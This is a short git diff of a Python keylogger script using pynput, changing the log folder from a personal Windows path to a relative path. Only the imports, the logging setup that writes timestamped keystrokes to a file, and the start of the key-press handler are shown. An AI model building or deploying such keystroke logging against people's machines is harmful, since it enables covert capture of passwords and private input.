@@ -2,7 +2,7 @@ import pynput
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir = r"C:\Users\gurpr\OneDrive\Documents\GP\Keylogger"
+log_dir = r"Keylogger" #Address of keylogger folder
 logging.basicConfig(filename= (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
